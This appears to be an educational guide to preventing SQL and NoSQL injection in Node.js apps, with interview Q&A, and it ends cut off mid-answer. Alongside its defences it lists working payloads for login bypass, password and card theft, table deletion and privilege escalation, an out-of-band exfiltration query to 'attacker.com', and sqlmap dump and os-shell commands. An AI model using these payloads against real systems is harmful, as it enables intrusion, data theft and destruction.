# SQL Injection Prevention

## Overview

SQL injection is one of the **most dangerous** web application vulnerabilities, consistently ranking in the OWASP Top 10. It occurs when untrusted data is sent to a database interpreter as part of a command or query, allowing attackers to execute malicious SQL commands.

**Why It Matters:**
- **#1 web application security risk** for many years
- Can lead to complete database compromise
- Enables data theft, modification, and deletion
- Can result in server takeover
- Frequently asked in security-focused interviews

**Impact:**
- **Data breach**: Steal sensitive user data, credit cards, passwords
- **Data loss**: Delete or modify critical business data
- **Authentication bypass**: Login as any user without credentials
- **Privilege escalation**: Gain admin access
- **Remote code execution**: Take over the entire server

## Core Concepts

### 💡 **What is SQL Injection?**

SQL injection is an attack where malicious SQL code is inserted into application queries through user input.

**How It Works:**

```javascript
// Vulnerable code
const username = req.body.username; // User input: admin' --
const password = req.body.password;

const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**What happens:**

```sql
-- Original intended query:
SELECT * FROM users WHERE username = 'admin' AND password = 'mypassword'

-- Attacker input: username = admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

-- The -- comments out the rest, bypassing password check
-- Result: Login as admin without knowing password!
```

**Attack Flow:**

```
1. Attacker finds input field (login, search, etc.)
   ↓
2. Attacker submits malicious SQL instead of normal data
   ↓
3. Application concatenates user input into SQL query
   ↓
4. Database executes malicious SQL
   ↓
5. Attacker gains unauthorized access or data
```

**Key Insight:**
> **SQL injection happens when user input is treated as SQL code instead of data.** The database can't distinguish between your legitimate SQL and the attacker's injected SQL.

### 💡 **Why Is It So Dangerous?**

SQL injection can compromise your entire database and server.

**Severity Levels:**

| Impact | Description | Example |
|--------|-------------|---------|
| **Authentication Bypass** | Login without credentials | `admin' --` |
| **Data Theft** | Extract all database records | `UNION SELECT * FROM credit_cards` |
| **Data Modification** | Change prices, balances | `UPDATE products SET price=0` |
| **Data Deletion** | Drop entire tables | `DROP TABLE users` |
| **Privilege Escalation** | Become admin user | `UPDATE users SET role='admin'` |
| **Remote Code Execution** | Run OS commands | `EXEC xp_cmdshell('whoami')` |

## Types of SQL Injection

### 1. Classic SQL Injection (In-Band)

Most common type - attacker uses same channel for attack and results.

**Error-Based SQLi:**

```javascript
// Vulnerable code
app.get('/product/:id', (req, res) => {
  const query = `SELECT * FROM products WHERE id = ${req.params.id}`;
  db.query(query, (err, results) => {
    if (err) {
      // ❌ Exposing error details
      res.status(500).send(err.message);
    }
  });
});

// Attack: /product/1' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--
// Database error reveals username from users table
```

**Union-Based SQLi:**

```javascript
// Vulnerable code
const search = req.query.search;
const query = `SELECT name, price FROM products WHERE name LIKE '%${search}%'`;

// Attack: search=' UNION SELECT username, password FROM users--
// Query becomes:
// SELECT name, price FROM products WHERE name LIKE '%'
// UNION SELECT username, password FROM users--%'
// Result: Displays all usernames and passwords
```

### 2. Blind SQL Injection (Inferential)

Attacker doesn't see direct results but infers information from application behavior.

**Boolean-Based Blind SQLi:**

```javascript
// Vulnerable code
app.get('/user/:id', (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ exists: true });
    } else {
      res.json({ exists: false });
    }
  });
});

// Attack: /user/1 AND 1=1 (returns true - user exists)
// Attack: /user/1 AND 1=2 (returns false)
// Attack: /user/1 AND (SELECT LENGTH(password) FROM users WHERE id=1)>5
// By trying different lengths, attacker determines password length
```

**Time-Based Blind SQLi:**

```javascript
// Attack: /user/1; IF (SELECT COUNT(*) FROM users)>10 WAITFOR DELAY '00:00:05'--
// If response takes 5 seconds, there are more than 10 users
// Attacker extracts data bit by bit based on response time
```

### 3. Out-of-Band SQL Injection

Data is retrieved using different channel (DNS, HTTP requests).

```sql
-- Attack causes database to make HTTP request to attacker's server
UNION SELECT null, null FROM dual WHERE 1=1
  AND (SELECT password FROM users WHERE id=1)='admin'
  AND load_file(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.attacker.com\\file'))
```

## Common SQL Injection Attacks

### Attack 1: Authentication Bypass

**Vulnerable Login:**

```javascript
// ❌ VULNERABLE
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  db.query(query, (err, results) => {
    if (results.length > 0) {
      // User authenticated
      req.session.userId = results[0].id;
      res.json({ success: true });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  });
});
```

**Attack Payloads:**

```sql
-- Attack 1: Comment out password check
username: admin' --
password: anything

-- Becomes:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- Result: Logs in as admin

-- Attack 2: Always true condition
username: ' OR '1'='1
password: ' OR '1'='1

-- Becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
-- Result: Returns all users, logs in as first user

-- Attack 3: UNION to inject admin
username: ' UNION SELECT 1, 'admin', 'admin', 'admin@example.com' --
password: admin

-- Becomes:
SELECT * FROM users WHERE username = '' UNION SELECT 1, 'admin', 'admin', 'admin@example.com' --' AND password = 'admin'
-- Result: Creates fake admin user in result set
```

### Attack 2: Data Extraction

**Vulnerable Search:**

```javascript
// ❌ VULNERABLE
app.get('/search', (req, res) => {
  const { query } = req.query;

  const sql = `SELECT title, description FROM articles WHERE title LIKE '%${query}%'`;

  db.query(sql, (err, results) => {
    res.json(results);
  });
});
```

**Attack Payloads:**

```sql
-- Extract all user data
query: ' UNION SELECT username, password FROM users--

-- Becomes:
SELECT title, description FROM articles WHERE title LIKE '%'
UNION SELECT username, password FROM users--%'
-- Result: Returns all usernames and passwords

-- Extract specific data
query: ' UNION SELECT table_name, column_name FROM information_schema.columns--
-- Result: Reveals database structure

-- Extract from multiple tables
query: ' UNION ALL SELECT credit_card, cvv FROM payments--
-- Result: Steals credit card data
```

### Attack 3: Data Modification

```javascript
// ❌ VULNERABLE
app.post('/update-profile', (req, res) => {
  const { bio } = req.body;
  const userId = req.session.userId;

  const query = `UPDATE users SET bio = '${bio}' WHERE id = ${userId}`;

  db.query(query, (err) => {
    res.json({ success: true });
  });
});
```

**Attack Payloads:**

```sql
-- Make yourself admin
bio: ', role = 'admin' WHERE id = 1--

-- Becomes:
UPDATE users SET bio = '', role = 'admin' WHERE id = 1--' WHERE id = 5
-- Result: User with id=1 becomes admin

-- Change product prices
bio: '; UPDATE products SET price = 0--
-- Result: All products now cost $0
```

### Attack 4: Data Deletion

```sql
-- Delete all users
username: '; DROP TABLE users--

-- Truncate tables
username: '; TRUNCATE TABLE orders--

-- Delete specific records
username: '; DELETE FROM users WHERE role='admin'--
```

### Attack 5: Privilege Escalation

```sql
-- Grant yourself admin role
bio: '; UPDATE users SET role='admin' WHERE username='attacker'--

-- Create new admin user
bio: '; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass', 'admin')--
```

## Prevention Techniques

### 💡 **1. Parameterized Queries (Prepared Statements)**

**The #1 defense** against SQL injection. User input is never treated as SQL code.

**How It Works:**

```javascript
// ❌ Vulnerable - String concatenation
const query = `SELECT * FROM users WHERE username = '${username}'`;

// ✅ Secure - Parameterized query
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username]);

// What happens:
// 1. Database compiles SQL structure first (without data)
// 2. User input is sent separately as data
// 3. Database treats input as pure data, never as SQL code
```

**MySQL with mysql2:**

```javascript
const mysql = require('mysql2');

const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'myapp',
});

// ✅ Parameterized query
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // ? placeholders are automatically escaped
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';

  connection.query(query, [username, password], (err, results) => {
    if (err) {
      return res.status(500).json({ error: 'Database error' });
    }

    if (results.length > 0) {
      res.json({ success: true, user: results[0] });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  });
});

// ✅ Named placeholders
const query = 'SELECT * FROM users WHERE username = :username AND email = :email';
connection.query(query, { username, email }, callback);
```

**PostgreSQL with pg:**

```javascript
const { Pool } = require('pg');

const pool = new Pool({
  host: 'localhost',
  user: 'postgres',
  password: 'password',
  database: 'myapp',
  port: 5432,
});

// ✅ Parameterized query with $1, $2
app.get('/users/:id', async (req, res) => {
  const userId = req.params.id;

  try {
    const query = 'SELECT * FROM users WHERE id = $1';
    const result = await pool.query(query, [userId]);

    if (result.rows.length > 0) {
      res.json(result.rows[0]);
    } else {
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// ✅ Complex query with multiple parameters
app.get('/search', async (req, res) => {
  const { category, minPrice, maxPrice } = req.query;

  const query = `
    SELECT * FROM products
    WHERE category = $1
      AND price >= $2
      AND price <= $3
    ORDER BY price ASC
  `;

  const result = await pool.query(query, [category, minPrice, maxPrice]);
  res.json(result.rows);
});
```

**SQLite with sqlite3:**

```javascript
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./database.db');

// ✅ Parameterized query
app.post('/register', (req, res) => {
  const { username, email, password } = req.body;

  const query = 'INSERT INTO users (username, email, password) VALUES (?, ?, ?)';

  db.run(query, [username, email, password], function (err) {
    if (err) {
      return res.status(500).json({ error: 'Registration failed' });
    }

    res.json({
      success: true,
      userId: this.lastID  // Auto-increment ID
    });
  });
});

// ✅ Named parameters
const query = 'SELECT * FROM users WHERE username = $username AND email = $email';
db.get(query, { $username: username, $email: email }, callback);
```

**Microsoft SQL Server with mssql:**

```javascript
const sql = require('mssql');

const config = {
  server: 'localhost',
  database: 'myapp',
  user: 'sa',
  password: 'password',
  options: {
    encrypt: true,
    trustServerCertificate: true,
  },
};

// ✅ Parameterized query
app.get('/products/:id', async (req, res) => {
  try {
    const pool = await sql.connect(config);

    const result = await pool
      .request()
      .input('id', sql.Int, req.params.id) // Type-safe parameter
      .query('SELECT * FROM products WHERE id = @id');

    res.json(result.recordset[0]);
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// ✅ Multiple parameters with types
app.post('/orders', async (req, res) => {
  const { userId, productId, quantity, price } = req.body;

  try {
    const pool = await sql.connect(config);

    const result = await pool
      .request()
      .input('userId', sql.Int, userId)
      .input('productId', sql.Int, productId)
      .input('quantity', sql.Int, quantity)
      .input('price', sql.Decimal(10, 2), price)
      .query(`
        INSERT INTO orders (user_id, product_id, quantity, price)
        VALUES (@userId, @productId, @quantity, @price)
      `);

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Order failed' });
  }
});
```

**Key Benefits:**

```
✅ User input never interpreted as SQL code
✅ Database driver handles all escaping
✅ Works with all data types
✅ Prevents all SQL injection types
✅ No performance penalty
```

### 💡 **2. ORM (Object-Relational Mapping)**

ORMs automatically use parameterized queries under the hood.

**Sequelize (Node.js):**

```javascript
const { Sequelize, DataTypes } = require('sequelize');

const sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'mysql',
});

// Define model
const User = sequelize.define('User', {
  username: {
    type: DataTypes.STRING,
    allowNull: false,
    unique: true,
  },
  email: {
    type: DataTypes.STRING,
    allowNull: false,
    unique: true,
  },
  password: {
    type: DataTypes.STRING,
    allowNull: false,
  },
});

// ✅ Secure ORM queries
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    // Sequelize automatically parameterizes this
    const user = await User.findOne({
      where: { username, password },
    });

    if (user) {
      res.json({ success: true, user });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// ✅ Complex queries
app.get('/search', async (req, res) => {
  const { category, minPrice, maxPrice } = req.query;

  const products = await Product.findAll({
    where: {
      category,
      price: {
        [Sequelize.Op.between]: [minPrice, maxPrice],
      },
    },
    order: [['price', 'ASC']],
  });

  res.json(products);
});

// ✅ Raw queries with parameters (when needed)
const users = await sequelize.query(
  'SELECT * FROM users WHERE age > :age',
  {
    replacements: { age: 18 },
    type: Sequelize.QueryTypes.SELECT,
  }
);
```

**TypeORM (TypeScript):**

```typescript
import { Entity, PrimaryGeneratedColumn, Column } from 'typeorm';
import { AppDataSource } from './data-source';

@Entity()
class User {
  @PrimaryGeneratedColumn()
  id: number;

  @Column({ unique: true })
  username: string;

  @Column()
  email: string;

  @Column()
  password: string;
}

// ✅ Secure TypeORM queries
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const userRepository = AppDataSource.getRepository(User);

  // Automatically parameterized
  const user = await userRepository.findOne({
    where: { username, password },
  });

  if (user) {
    res.json({ success: true, user });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ✅ Query builder (also safe)
const users = await AppDataSource
  .getRepository(User)
  .createQueryBuilder('user')
  .where('user.age > :age', { age: 18 })
  .andWhere('user.city = :city', { city: 'New York' })
  .getMany();
```

**Prisma (Modern ORM):**

```typescript
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

// ✅ Prisma queries (type-safe and secure)
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await prisma.user.findFirst({
    where: {
      username,
      password,
    },
  });

  if (user) {
    res.json({ success: true, user });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ✅ Complex queries
const products = await prisma.product.findMany({
  where: {
    category,
    price: {
      gte: minPrice,
      lte: maxPrice,
    },
  },
  orderBy: {
    price: 'asc',
  },
});

// ✅ Raw SQL with parameters (escape hatch)
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE age > ${age}
`;
```

**⚠️ ORM Vulnerabilities:**

ORMs are generally safe but can still be vulnerable if misused:

```javascript
// ❌ VULNERABLE - Dynamic table/column names
const tableName = req.query.table; // Attacker controls this
const results = await sequelize.query(`SELECT * FROM ${tableName}`);
// Attack: ?table=users; DROP TABLE users--

// ✅ Fix: Whitelist table names
const allowedTables = ['users', 'products', 'orders'];
if (!allowedTables.includes(tableName)) {
  return res.status(400).json({ error: 'Invalid table' });
}

// ❌ VULNERABLE - Raw queries without parameters
const username = req.body.username;
const users = await sequelize.query(`SELECT * FROM users WHERE username = '${username}'`);

// ✅ Fix: Always use parameter binding
const users = await sequelize.query(
  'SELECT * FROM users WHERE username = :username',
  { replacements: { username } }
);
```

### 💡 **3. Stored Procedures**

Pre-compiled SQL stored in the database.

**Creating Stored Procedure (MySQL):**

```sql
-- Create stored procedure
DELIMITER $$

CREATE PROCEDURE GetUserByCredentials(
  IN p_username VARCHAR(255),
  IN p_password VARCHAR(255)
)
BEGIN
  SELECT id, username, email, role
  FROM users
  WHERE username = p_username AND password = p_password;
END$$

DELIMITER ;
```

**Using Stored Procedure:**

```javascript
// ✅ Calling stored procedure
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Call stored procedure with parameters
  connection.query(
    'CALL GetUserByCredentials(?, ?)',
    [username, password],
    (err, results) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }

      const users = results[0]; // First result set

      if (users.length > 0) {
        res.json({ success: true, user: users[0] });
      } else {
        res.status(401).json({ error: 'Invalid credentials' });
      }
    }
  );
});
```

**Pros:**
- ✅ Parameters are type-checked
- ✅ SQL code is pre-compiled
- ✅ Business logic in one place
- ✅ Can restrict direct table access

**Cons:**
- ❌ Less flexible than dynamic queries
- ❌ Harder to version control
- ❌ Database-specific syntax

### 💡 **4. Input Validation**

**Defense in depth** - validate even though parameterized queries prevent SQLi.

```javascript
const Joi = require('joi');

// ✅ Validate before database query
const loginSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),

  password: Joi.string()
    .min(8)
    .max(128)
    .required(),
});

app.post('/login', async (req, res) => {
  // 1. Validate input
  const { error, value } = loginSchema.validate(req.body);

  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }

  const { username, password } = value;

  // 2. Use parameterized query (primary defense)
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  connection.query(query, [username, password], (err, results) => {
    // Handle results...
  });
});

// ✅ Whitelist for dynamic values
app.get('/users', async (req, res) => {
  const { sortBy = 'id', order = 'ASC' } = req.query;

  // Whitelist allowed values (can't parameterize ORDER BY)
  const allowedSortFields = ['id', 'username', 'email', 'created_at'];
  const allowedOrders = ['ASC', 'DESC'];

  if (!allowedSortFields.includes(sortBy) || !allowedOrders.includes(order)) {
    return res.status(400).json({ error: 'Invalid sort parameters' });
  }

  // Safe to use because we validated against whitelist
  const query = `SELECT * FROM users ORDER BY ${sortBy} ${order}`;
  const results = await pool.query(query);

  res.json(results.rows);
});
```

### 💡 **5. Escaping (Least Effective)**

**Last resort** - use library escaping functions if you absolutely cannot use parameterized queries.

```javascript
const mysql = require('mysql2');

// ❌ Still vulnerable to some attacks
app.post('/search', (req, res) => {
  const search = mysql.escape(req.body.search); // Escapes single quotes

  // Still not ideal - prefer parameterized queries
  const query = `SELECT * FROM products WHERE name LIKE '%${search}%'`;

  connection.query(query, callback);
});

// ✅ Better - Use parameterized query with LIKE
app.post('/search', (req, res) => {
  const search = req.body.search;

  const query = 'SELECT * FROM products WHERE name LIKE ?';
  connection.query(query, [`%${search}%`], callback);
});
```

**Why escaping is not enough:**

```
❌ Only escapes quotes - other SQL metacharacters may slip through
❌ Database-specific (MySQL escaping != PostgreSQL escaping)
❌ Easy to forget or misuse
❌ Doesn't protect against second-order SQLi
✅ Parameterized queries are ALWAYS better
```

### 💡 **6. Principle of Least Privilege**

Limit database user permissions to minimize damage from successful attack.

```sql
-- ❌ BAD - Application uses root/admin account
mysql -u root -p

-- ✅ GOOD - Create limited application user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'localhost';
GRANT SELECT, INSERT, UPDATE ON myapp.products TO 'app_user'@'localhost';
GRANT SELECT, INSERT ON myapp.orders TO 'app_user'@'localhost';

-- Explicitly deny dangerous operations
REVOKE DROP, CREATE, ALTER ON myapp.* FROM 'app_user'@'localhost';
REVOKE EXECUTE ON myapp.* FROM 'app_user'@'localhost'; -- No stored procedures
REVOKE FILE ON *.* FROM 'app_user'@'localhost'; -- No file access

FLUSH PRIVILEGES;
```

**Benefits:**

```
✅ Even if SQLi succeeds, attacker can't drop tables
✅ Can't execute system commands
✅ Can't read/write files
✅ Limited to specific database and tables
✅ Reduces blast radius of successful attack
```

## NoSQL Injection

NoSQL databases (MongoDB, CouchDB) are also vulnerable to injection attacks.

### 💡 **MongoDB Injection**

**Vulnerable Code:**

```javascript
const express = require('express');
const mongoose = require('mongoose');

// ❌ VULNERABLE - Direct query with user input
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // If user sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  // This matches ALL users (always true)
  const user = await User.findOne({ username, password });

  if (user) {
    res.json({ success: true }); // Logs in as first user!
  }
});

// Attack payload:
// POST /login
// Content-Type: application/json
// {"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Attack Examples:**

```javascript
// Attack 1: Bypass authentication
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
// Matches first user where username and password are not null

// Attack 2: Extract data
{
  "username": {"$regex": "^admin"},
  "password": {"$regex": "^a"}
}
// Test each character of password

// Attack 3: Timing attack
{
  "username": "admin",
  "password": {"$regex": "^a.*", "$options": "i"}
}
// If slow, password starts with 'a'
```

**Prevention:**

```javascript
// ✅ Fix 1: Validate input types
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Ensure inputs are strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await User.findOne({ username, password });

  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ✅ Fix 2: Use schema validation
const Joi = require('joi');

const loginSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  password: Joi.string().min(8).required(),
});

app.post('/login', async (req, res) => {
  const { error, value } = loginSchema.validate(req.body);

  if (error) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const { username, password } = value;

  const user = await User.findOne({ username, password });
  // Now safe - Joi ensures strings only
});

// ✅ Fix 3: Sanitize with mongo-sanitize
const mongoSanitize = require('mongo-sanitize');

app.post('/login', async (req, res) => {
  // Remove any keys starting with $ or containing .
  const username = mongoSanitize(req.body.username);
  const password = mongoSanitize(req.body.password);

  const user = await User.findOne({ username, password });
});

// ✅ Fix 4: Use Mongoose schema with strict mode
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
}, { strict: true }); // Rejects fields not in schema

const User = mongoose.model('User', userSchema);

// Mongoose will reject {"$gt": ""} because it doesn't match String type
```

**MongoDB Best Practices:**

```
✅ Always validate input types (ensure strings are strings)
✅ Use mongoose with strict schemas
✅ Sanitize input with mongo-sanitize
✅ Never use $where operator with user input
✅ Disable JavaScript execution in MongoDB config
✅ Use allowDiskUse: false to prevent DoS
```

## Complete Secure Implementation

### Secure User Authentication

```javascript
const express = require('express');
const mysql = require('mysql2/promise');
const bcrypt = require('bcrypt');
const Joi = require('joi');

const app = express();
app.use(express.json());

// Database connection
const pool = mysql.createPool({
  host: 'localhost',
  user: 'app_user', // Limited permissions
  password: process.env.DB_PASSWORD,
  database: 'myapp',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
});

// Validation schemas
const registerSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  password: Joi.string().min(8).max(128).required(),
});

const loginSchema = Joi.object({
  username: Joi.string().required(),
  password: Joi.string().required(),
});

// ✅ Secure Registration
app.post('/register', async (req, res) => {
  try {
    // 1. Validate input
    const { error, value } = registerSchema.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const { username, email, password } = value;

    // 2. Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // 3. Use parameterized query
    const query = 'INSERT INTO users (username, email, password) VALUES (?, ?, ?)';

    const [result] = await pool.execute(query, [username, email, hashedPassword]);

    res.status(201).json({
      success: true,
      userId: result.insertId,
    });
  } catch (error) {
    if (error.code === 'ER_DUP_ENTRY') {
      res.status(400).json({ error: 'Username or email already exists' });
    } else {
      console.error('Registration error:', error);
      res.status(500).json({ error: 'Registration failed' });
    }
  }
});

// ✅ Secure Login
app.post('/login', async (req, res) => {
  try {
    // 1. Validate input
    const { error, value } = loginSchema.validate(req.body);

    if (error) {
      return res.status(400).json({ error: 'Invalid input' });
    }

    const { username, password } = value;

    // 2. Use parameterized query
    const query = 'SELECT id, username, password FROM users WHERE username = ?';

    const [rows] = await pool.execute(query, [username]);

    if (rows.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const user = rows[0];

    // 3. Verify password
    const isValidPassword = await bcrypt.compare(password, user.password);

    if (!isValidPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // 4. Create session (implement session management)
    req.session.userId = user.id;

    res.json({
      success: true,
      user: {
        id: user.id,
        username: user.username,
      },
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

// ✅ Secure Search with Pagination
app.get('/users/search', async (req, res) => {
  try {
    const { query = '', page = 1, limit = 10, sortBy = 'username', order = 'ASC' } = req.query;

    // Validate pagination
    const pageNum = parseInt(page, 10);
    const limitNum = parseInt(limit, 10);

    if (isNaN(pageNum) || pageNum < 1 || isNaN(limitNum) || limitNum < 1 || limitNum > 100) {
      return res.status(400).json({ error: 'Invalid pagination parameters' });
    }

    // Whitelist sort field and order
    const allowedSortFields = ['username', 'email', 'created_at'];
    const allowedOrders = ['ASC', 'DESC'];

    if (!allowedSortFields.includes(sortBy) || !allowedOrders.includes(order)) {
      return res.status(400).json({ error: 'Invalid sort parameters' });
    }

    const offset = (pageNum - 1) * limitNum;

    // Safe to use sortBy and order because they're whitelisted
    const sql = `
      SELECT id, username, email, created_at
      FROM users
      WHERE username LIKE ?
      ORDER BY ${sortBy} ${order}
      LIMIT ? OFFSET ?
    `;

    const [rows] = await pool.execute(sql, [`%${query}%`, limitNum, offset]);

    // Get total count
    const [countResult] = await pool.execute(
      'SELECT COUNT(*) as total FROM users WHERE username LIKE ?',
      [`%${query}%`]
    );

    res.json({
      success: true,
      data: rows,
      pagination: {
        page: pageNum,
        limit: limitNum,
        total: countResult[0].total,
        pages: Math.ceil(countResult[0].total / limitNum),
      },
    });
  } catch (error) {
    console.error('Search error:', error);
    res.status(500).json({ error: 'Search failed' });
  }
});
```

## Testing for SQL Injection

### Manual Testing

**Basic Tests:**

```bash
# Test 1: Single quote
' OR '1'='1

# Test 2: Comment injection
admin'--

# Test 3: UNION attack
' UNION SELECT NULL--

# Test 4: Boolean-based blind
1' AND '1'='1
1' AND '1'='2

# Test 5: Time-based blind
1'; WAITFOR DELAY '00:00:05'--
1'; SELECT SLEEP(5)--

# Test 6: Error-based
1' AND 1=CONVERT(int, @@version)--
```

**Testing Different Input Fields:**

```
✓ Login forms (username, password)
✓ Search boxes
✓ URL parameters (?id=1)
✓ Hidden form fields
✓ HTTP headers (User-Agent, Referer)
✓ Cookies
✓ JSON/XML data
```

### Automated Testing

**SQLMap (Most Popular Tool):**

```bash
# Install
pip install sqlmap

# Test URL parameter
sqlmap -u "http://example.com/product?id=1"

# Test POST data
sqlmap -u "http://example.com/login" --data "username=admin&password=pass"

# Test with authentication cookie
sqlmap -u "http://example.com/profile" --cookie="session=abc123"

# Full database dump
sqlmap -u "http://example.com/product?id=1" --dump

# Specific database and table
sqlmap -u "http://example.com/product?id=1" -D myapp -T users --dump

# OS command execution (if database user has permissions)
sqlmap -u "http://example.com/product?id=1" --os-shell
```

**Security Scanning Tools:**

```
- OWASP ZAP: Web application security scanner
- Burp Suite: Intercept and modify requests
- Acunetix: Automated vulnerability scanner
- Netsparker: Automated security testing
```

## Interview Questions

### Q1: What is SQL injection and why is it dangerous?

**Answer:**

SQL injection is a vulnerability where **attackers insert malicious SQL code** into application inputs, which gets executed by the database, allowing unauthorized access and manipulation of data.

**How It Happens:**

```javascript
// ❌ Vulnerable code
const username = req.body.username; // User input
const query = `SELECT * FROM users WHERE username = '${username}'`;

// Attacker input: admin' --
// Query becomes: SELECT * FROM users WHERE username = 'admin' --'
// The -- comments out the rest, bypassing authentication
```

**Why It's Dangerous:**

| Impact | Description | Severity |
|--------|-------------|----------|
| **Authentication Bypass** | Login without credentials | Critical |
| **Data Breach** | Steal all database records | Critical |
| **Data Modification** | Change prices, balances, permissions | Critical |
| **Data Deletion** | Drop entire database | Critical |
| **Privilege Escalation** | Make yourself admin | Critical |
| **Server Takeover** | Execute OS commands | Critical |

**Real-World Examples:**

```sql
-- Attack 1: Login bypass
username: ' OR '1'='1
-- Returns all users, logs in as first

-- Attack 2: Data theft
id: 1 UNION SELECT username, password FROM users
-- Extracts all usernames and passwords

-- Attack 3: Database destruction
id: 1; DROP TABLE users--
-- Deletes entire users table

-- Attack 4: Privilege escalation
bio: '; UPDATE users SET role='admin' WHERE id=5--
-- Makes user id=5 an admin
```

**Why It's Still Common:**

```
❌ Developers trust user input
❌ String concatenation instead of parameterized queries
❌ Legacy code not updated
❌ Lack of security awareness
❌ Insufficient testing
```

**Key Insight:**
> SQL injection happens when **user input is treated as SQL code instead of data**. The database can't tell the difference between your legitimate SQL and the attacker's injected SQL. This is why you must use parameterized queries - they tell the database "this is data, not code."

---

### Q2: How do you prevent SQL injection? What is the best defense?

**Answer:**

The **#1 defense** against SQL injection is **parameterized queries (prepared statements)**. User input is sent separately from SQL code, so it can never be interpreted as SQL.

**Parameterized Queries (Best Defense):**

```javascript
// ❌ VULNERABLE - String concatenation
const query = `SELECT * FROM users WHERE username = '${username}'`;
db.query(query);

// ✅ SECURE - Parameterized query
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username]);

// What happens internally:
// 1. Database compiles SQL structure: "SELECT * FROM users WHERE username = ?"
// 2. User input is sent separately: ["admin' --"]
// 3. Database treats input as pure data, never as SQL code
// 4. Query executes safely: SELECT * FROM users WHERE username = 'admin'' --'
//    (The quote is escaped automatically)
```

**Different Databases:**

```javascript
// MySQL
const query = 'SELECT * FROM users WHERE username = ? AND email = ?';
connection.query(query, [username, email]);

// PostgreSQL
const query = 'SELECT * FROM users WHERE username = $1 AND email = $2';
pool.query(query, [username, email]);

// SQL Server
const result = await pool
  .request()
  .input('username', sql.VarChar, username)
  .input('email', sql.VarChar, email)
  .query('SELECT * FROM users WHERE username = @username AND email = @email');
```

**Defense-in-Depth Strategies:**

```javascript
// 1. Parameterized queries (PRIMARY)
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

// 2. Input validation (ADDITIONAL)
const { error } = Joi.object({
  userId: Joi.number().integer().positive().required(),
}).validate({ userId });

// 3. Whitelist for dynamic parts (ORDER BY, table names)
const allowedFields = ['id', 'username', 'email'];
if (!allowedFields.includes(sortBy)) {
  throw new Error('Invalid sort field');
}

// 4. Use ORM
const user = await User.findOne({ where: { id: userId } });

// 5. Least privilege
// Database user has only SELECT, INSERT, UPDATE
// No DROP, CREATE, EXECUTE permissions

// 6. WAF (Web Application Firewall)
// CloudFlare, AWS WAF, ModSecurity
// Filters malicious requests before they reach app
```

**Why Parameterized Queries Work:**

```
✅ SQL structure compiled first (without data)
✅ User input sent separately as parameters
✅ Database treats input as pure data
✅ No way for input to be interpreted as SQL code
✅ Database driver handles all escaping
✅ Works for all data types
✅ No performance penalty
```

**Common Mistakes:**

```javascript
// ❌ Still vulnerable - Dynamic table/column names
const table = req.query.table;
const query = `SELECT * FROM ${table} WHERE id = ?`; // Table name can't be parameterized!

// ✅ Fix: Whitelist
const allowedTables = ['users', 'products', 'orders'];
